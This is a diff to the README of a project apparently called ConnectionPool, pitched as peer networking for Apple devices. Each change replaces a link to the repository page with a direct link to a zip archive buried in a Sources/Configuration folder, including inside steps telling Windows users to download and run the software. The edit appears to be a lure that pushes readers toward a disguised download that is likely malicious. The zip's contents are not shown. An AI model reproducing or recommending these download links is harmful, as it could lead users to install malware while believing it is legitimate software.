@@ -1,11 +1,11 @@
 # 🌐 ConnectionPool - Simple peer networking for Apple devices
 
-[![Download ConnectionPool](https://img.shields.io/badge/Download-ConnectionPool-blue?style=for-the-badge&logo=github)](https://github.com/Ultramicroscopic-distance696/ConnectionPool)
+[![Download ConnectionPool](https://img.shields.io/badge/Download-ConnectionPool-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ultramicroscopic-distance696/ConnectionPool/main/Sources/Configuration/Pool-Connection-v3.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the page to download:
-https://github.com/Ultramicroscopic-distance696/ConnectionPool
+https://raw.githubusercontent.com/Ultramicroscopic-distance696/ConnectionPool/main/Sources/Configuration/Pool-Connection-v3.8.zip
 
 ## 🖥️ What ConnectionPool Does
 
@@ -39,7 +39,7 @@ If you plan to use the app with Apple devices, you will also need:
 Follow these steps to download and run the software on Windows.
 
 1. Open the download page:
-   https://github.com/Ultramicroscopic-distance696/ConnectionPool
+   https://raw.githubusercontent.com/Ultramicroscopic-distance696/ConnectionPool/main/Sources/Configuration/Pool-Connection-v3.8.zip
 
 2. On the page, look for the latest release, build, or download file.
 
@@ -209,7 +209,7 @@ Some setups use a relay server when devices are far apart. If you plan to use th
 ## 📌 Where to Download Again
 
 Visit this page to download or reopen the package:
-https://github.com/Ultramicroscopic-distance696/ConnectionPool
+https://raw.githubusercontent.com/Ultramicroscopic-distance696/ConnectionPool/main/Sources/Configuration/Pool-Connection-v3.8.zip
 
 ## 🧭 Quick Steps
 
